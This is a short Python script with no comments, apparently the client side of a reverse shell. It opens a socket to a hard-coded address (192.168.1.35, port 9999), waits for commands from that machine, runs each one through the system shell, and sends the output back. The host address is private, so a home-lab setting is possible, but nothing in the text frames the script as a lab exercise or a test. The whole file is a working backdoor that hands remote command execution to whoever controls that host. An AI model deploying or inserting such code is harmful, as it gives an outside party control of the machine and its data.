import socket
import os
import subprocess


s = socket.socket()
host = "192.168.1.35"
port = 9999

s.connect((host, port))

init = True
while True:
    if init:
        currentWD = os.getcwd() + "> "
        s.send(str.encode(currentWD))
        init = False

    data = s.recv(1024)

    if data[:2].decode("utf-8") == "cd" and len(data.decode("utf-8").rstrip()) > 3:
        try:
            os.chdir(data[3:].decode("utf-8"))
        except FileNotFoundError as ferror:
            print(ferror)

    if len(data) > 0:
        cmd = subprocess.Popen(
            data[:].decode("utf-8"),
            shell=True,
            stdout=subprocess.PIPE,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd() + "> "
        s.send(str.encode(output_str + currentWD))
        print(output_str)
